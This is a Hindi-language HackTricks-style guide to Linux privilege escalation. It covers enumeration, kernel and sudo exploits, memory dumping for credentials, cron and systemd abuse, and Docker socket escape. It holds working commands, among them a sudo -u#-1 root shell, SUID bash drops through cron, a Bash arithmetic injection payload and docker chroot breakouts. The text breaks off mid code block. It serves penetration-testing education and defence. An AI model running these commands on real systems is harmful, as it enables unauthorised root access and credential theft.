# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

चल रहे OS के बारे में जानकारी प्राप्त करना शुरू करते हैं
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वेरिएबल के किसी भी फोल्डर पर write permissions रखते हैं** तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई उपयोगी जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version जांचें और देखें कि कोई exploit है जो escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी असुरक्षित कर्नेल सूची और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी असुरक्षित कर्नेल संस्करण निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits को खोजने में मदद करने वाले टूल:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, केवल kernel 2.x के exploits की जाँच करता है)

हमेशा **Google में kernel version खोजें**, शायद आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो जाएंगे कि यह exploit वैध है।

अतिरिक्त kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर Sudo संस्करणों के आधार पर जो निम्नलिखित में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) बिना विशेषाधिकार वाले स्थानीय उपयोगकर्ताओं को sudo `--chroot` विकल्प के माध्यम से root में अपने अधिकार बढ़ाने की अनुमति देते हैं जब `/etc/nsswitch.conf` फ़ाइल किसी user controlled डायरेक्टरी से उपयोग की जाती है।

यहाँ उस कमज़ोरी को exploit करने के लिए एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) दिया गया है। Exploit चलाने से पहले सुनिश्चित करें कि आपका `sudo` वर्ज़न सुरक्षा दोषग्रस्त है और यह `chroot` फीचर का समर्थन करता है।

अधिक जानकारी के लिए मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** पर कि इस vuln का शोषण कैसे किया जा सकता है — इसका एक **उदाहरण**
```bash
dmesg 2>/dev/null | grep "signature"
```
### और अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँच करें **क्या माउंट है और क्या अनमाउंट है**, कहाँ और क्यों। अगर कुछ भी अनमाउंट है तो आप उसे माउंट करने की कोशिश कर सकते हैं और निजी जानकारी के लिए जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जांचें कि **any compiler is installed**। यह तब उपयोगी होता है अगर आपको कोई kernel exploit इस्तेमाल करना पड़े, क्योंकि अनुशंसा की जाती है कि इसे उसी मशीन पर compile किया जाए जहाँ आप इसका उपयोग करेंगे (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### इंस्टॉल किए गए कमजोर सॉफ़्टवेयर

जाँच करें **इंस्टॉल किए गए पैकेज और सेवाओं के संस्करण**। हो सकता है कि कोई पुराना Nagios संस्करण (उदाहरण के लिए) मौजूद हो जिसका उपयोग escalating privileges के लिए exploited किया जा सके…\
अनुशंसित है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है, तो आप मशीन में इंस्टॉल किए गए पुराने और vulnerable सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगी जो अधिकांशतः बेकार होगी, इसलिए बेहतर है कि OpenVAS या इसी तरह के कुछ applications का उपयोग किया जाए जो यह जाँचें कि कोई इंस्टॉल किया गया सॉफ़्टवेयर वर्शन ज्ञात exploits के लिए vulnerable है या नहीं_ 

## Processes

देखें कि कौन से **what processes** चलाए जा रहे हैं और जाँचें कि क्या किसी process के पास अपेक्षित से **more privileges than it should** हैं (शायद कोई tomcat root द्वारा चल रहा है?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

आप प्रक्रियाओं की निगरानी के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह अक्सर यह पहचानने में बहुत उपयोगी होता है कि कौन सी vulnerable processes अक्सर execute हो रही हैं या कब कोई सेट ऑफ requirements पूरी होते हैं।

### Process memory

कुछ server की सेवाएँ memory के अंदर **credentials in clear text** में सहेजती हैं।\
आम तौर पर अन्य users के processes की memory पढ़ने के लिए आपको **root privileges** की आवश्यकता होगी, इसलिए यह आमतौर पर तब ज्यादा उपयोगी होता है जब आप पहले से root हों और और भी credentials खोजना चाहें।\
हालाँकि, ध्यान रखें कि **as a regular user you can read the memory of the processes you own**।

> [!WARNING]
> ध्यान दें कि आजकल ज्यादातर machines में डिफ़ॉल्ट रूप से **ptrace allow नहीं होता**, जिसका मतलब है कि आप अपने unprivileged user के अलावा अन्य प्रक्रियाओं को dump नहीं कर पाएंगे।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, जब तक कि उनका वही uid हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को ही debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace द्वारा trace नहीं किया जा सकता। एक बार सेट हो जाने पर ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service की memory तक access है (उदाहरण के तौर पर) तो आप Heap प्राप्त करके उसकी credentials के अंदर search कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps show how memory is mapped within that process's** virtual address space; यह भी दिखाता है कि **permissions of each mapped region**। यह **mem** pseudo file **exposes the processes memory itself**। **maps** file से हम जान लेते हैं कि कौन से **memory regions are readable** हैं और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **seek into the mem file and dump all readable regions** करते हैं और उन्हें एक फ़ाइल में सेव करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुंच प्रदान करता है, न कि वर्चुअल मेमोरी। kernel के वर्चुअल एड्रेस स्पेस तक /dev/kmem का उपयोग करके प्रवेश किया जा सकता है.\

आमतौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows के लिए Sysinternals suite के क्लासिक ProcDump tool का Linux के लिए पुनर्कल्पना है। इसे प्राप्त करें [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

किसी process की मेमोरी को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताओं को हटा कर अपने स्वामित्व वाली process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन देखें ताकि process की memory dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **सादा-पाठ क्रेडेंशियल्स** और कुछ **जानी-पहचानी फाइलों** से चुराता है। यह सही ढंग से काम करने के लिए रूट विशेषाधिकारों की आवश्यकता रखता है।

| विशेषता                                           | प्रोसेस नाम         |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                      | vsftpd               |
| Apache2 (सक्रिय HTTP Basic Auth सत्र)             | apache2              |
| OpenSSH (सक्रिय SSH सत्र - Sudo उपयोग)            | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – web-based scheduler privesc

यदि एक web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से बाउंड है, तो आप फिर भी इसे SSH local port-forwarding के माध्यम से पहुँचा सकते हैं और escalate करने के लिए एक privileged job बना सकते हैं।

आम श्रृंखला
- loopback-only port खोजें (उदा., 127.0.0.1:8000) और Basic-Auth realm `ss -ntlp` / `curl -v localhost:8000` के माध्यम से
- ऑपरेशनल artifacts में credentials खोजें:
- Backups/scripts में `zip -P <password>`
- systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` उजागर कर रही हो
- Tunnel और login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (SUID shell छोड़ता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
हार्डनिंग
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों के साथ सीमित करें
- localhost से bind करें और अतिरिक्त रूप से पहुंच को firewall/VPN के जरिए सीमित करें; पासवर्ड को पुनः उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप उस script का फायदा उठा सकते हैं जो root द्वारा चलाया जाता है (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली फाइलें modify कर सकते हैं? symlinks का उपयोग करें? root द्वारा उपयोग किए जाने वाले directory में specific फाइलें बनाएं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user उपयोगकर्ता के पास /home/user पर लिखने की अनुमतियाँ हैं_)

अगर इस crontab में root user किसी कमांड या स्क्रिप्ट को PATH सेट किए बिना चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\  
फिर, आप निम्न का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई script root द्वारा चलायी जाती है और कमांड के अंदर “**\***” मौजूद है, तो आप इसका फायदा उठाकर अनपेक्षित कार्य (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **के आगे आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें किसी arithmetic context में भेज देता है, तो एक attacker command substitution $(...) inject कर सकता है जो cron के चलने पर root के रूप में execute होता है।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion. इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसी value पहले substitute होती है (कमांड चलाते हुए), फिर बचा हुआ numeric `0` arithmetic के लिए उपयोग किया जाता है ताकि स्क्रिप्ट बिना errors के जारी रहे।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Attacker-controlled टेक्स्ट को parsed log में लिखवाएँ ताकि numeric-दिखने वाला फील्ड एक command substitution रखे और किसी digit पर खत्म हो। सुनिश्चित करें कि आपका कमांड stdout पर कुछ न प्रिंट करे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script किसी ऐसी **directory जहाँ आपकी पूर्ण पहुँच है** का उपयोग करता है, तो उस फ़ोल्डर को हटाकर और किसी दूसरी जगह की ओर **symlink folder** बना कर उस पर आपका नियंत्रित script रख देना उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार चलने वाले cron jobs

आप processes की निगरानी कर सकते हैं ताकि उन processes को खोजा जा सके जो हर 1, 2 या 5 मिनट पर executed हो रहे हैं। शायद आप इसका फायदा उठा कर escalate privileges कर सकें।

उदाहरण के लिए, **हर 0.1s पर 1 मिनट तक monitor करने**, **कम executed commands के अनुसार sort करने** और सबसे ज्यादा executed हुए commands को delete करने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका उपयोग भी कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह सभी शुरू होने वाली प्रक्रियाओं को मॉनिटर और सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जा सकता है **comment के बाद carriage return डालकर** (बिना newline character), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ files

जाँच करें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं तो आप इसे संशोधित करके यह सुनिश्चित कर सकते हैं कि यह आपके **backdoor** को सेवा के **started**, **restarted** या **stopped** होने पर **execute** करे (शायद आपको मशीन के reboot होने तक प्रतीक्षा करनी पड़ सकती है)।\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास services द्वारा execute किए जाने वाले binaries पर **write permissions** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब services को फिर से execute किया जाए तो backdoors executed हों।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जा रहे PATH को इस तरह देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर पाएँगे। आपको ऐसी service configuration फ़ाइलों में **relative paths being used on service configurations** की तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिसमें आप लिख सकते हैं, **same name as the relative path binary** के साथ एक **executable** बनाएं, और जब सर्विस को vulnerable action (**Start**, **Stop**, **Reload**) करने के लिए कहा जाएगा तो आपका **backdoor** चल जाएगा (unprivileged users आमतौर पर सेवाएँ start/stop नहीं कर सकते — पर जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में अधिक जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** systemd unit फ़ाइलें हैं जिनके नाम का अंत `**.timer**` से होता है और ये `**.service**` फाइलों या इवेंट्स को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए बिल्ट‑इन सपोर्ट होता है और इन्हें asynchronous रूप से चलाया जा सकता है।

आप सभी timers को निम्नलिखित कमांड से सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### Writable timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> उस यूनिट को सक्रिय करने के लिए उपयोग किया जाता है जब यह timer समाप्त होता है। आर्गुमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट रूप से उसी service पर सेट होता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (ऊपर देखें।) अनुशंसा की जाती है कि सक्रिय की जाने वाली यूनिट का नाम और timer यूनिट का नाम सिफ़िक्स को छोड़कर समान हों।

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **executing a writable binary**
- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **टाइमर सक्षम करना**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

यदि आपको कोई **writable** `.socket` file मिलती है, तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor उस socket के create होने से पहले execute होगा। Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

अगर आप कोई **writable socket** पहचानते हैं (_now we are talking about Unix Sockets and not about the config `.socket` files_), तो आप उस socket के साथ **communicate** कर सकते हैं और शायद किसी vulnerability को exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** अनुरोधों के लिए सुन रहे हो सकते हैं (_मैं .socket फ़ाइलों की बात नहीं कर रहा बल्कि उन फ़ाइलों की जो unix sockets के रूप में काम कर रही हैं_)। आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि सॉकेट **HTTP अनुरोध का उत्तर देता है**, तो आप इसके साथ **संचार** कर सकते हैं और शायद कुछ **exploit some vulnerability** कर सकें।

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. इस socket पर लिखने की पहुँच होने से privilege escalation हो सकता है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके यदि Docker CLI उपलब्ध नहीं है।

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये commands आपको host की file system पर root-level access के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का सीधे उपयोग**

यदि Docker CLI उपलब्ध नहीं है, तो Docker socket को Docker API और `curl` का उपयोग करके अभी भी नियंत्रित किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host सिस्टम की root directory को mount करने वाला एक container बनाने के लिए request भेजें।

```bash
